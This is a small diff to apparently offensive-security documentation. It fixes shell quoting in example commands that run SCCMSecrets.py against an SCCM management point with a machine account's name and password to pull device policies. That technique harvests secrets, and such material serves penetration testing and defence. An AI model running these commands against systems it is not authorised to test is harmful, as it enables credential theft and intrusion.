@@ -66,7 +66,7 @@ To this end, [SCCMSecrets.py](https://github.com/synacktiv/SCCMSecrets/) (Python
 
 ```bash
 # Plain HTTP
-python3 SCCMSecrets.py policies -mp http://$MP_IP -u '$MACHINE_NAME' -p '$MACHINE_PASSWORD' -cn 'newdevice'
+python3 SCCMSecrets.py policies -mp "http://$MP_IP" -u "$MACHINE_NAME" -p "$MACHINE_PASSWORD" -cn "newdevice"
 
 # HTTPS with client certificate
 python3 SCCMSecrets.py policies -mp https://$MP_IP -u '$MACHINE_NAME' -p '$MACHINE_PASSWORD' -cn 'newdevice' --pki-cert ./cert.pem --pki-key ./key.pem
